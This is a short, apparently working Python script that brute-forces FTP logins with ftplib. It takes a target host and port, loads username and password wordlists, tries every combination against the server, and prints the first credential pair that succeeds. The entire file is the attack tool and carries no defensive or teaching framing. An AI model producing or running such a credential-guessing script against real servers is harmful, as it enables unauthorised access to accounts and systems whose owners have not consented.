import argparse
from ftplib import FTP

#argparse setup
parser = argparse.ArgumentParser()
parser.add_argument("-H", "--host", help="Target host", required=True)
parser.add_argument("-P", "--port", type=int, default=21, help="Target port")
parser.add_argument("-u", "--userlist", help="Username list", required=True)
parser.add_argument("-w", "--passlist", help="Password list", required=True)
args = parser.parse_args()
with open(args.userlist, "r") as file:
    users = file.read().splitlines()
with open(args.passlist, "r") as file:
    passwords = file.read().splitlines()
    for user in users:
        for pwd in passwords:
            try:
                ftp = FTP()
                ftp.connect(args.host, args.port, timeout=1)
                ftp.login(user, pwd)
                print(f"login successful, {user} & {pwd}")
                ftp.quit()
                exit()
            except Exception as e:
                print(f"error occur, {e}")

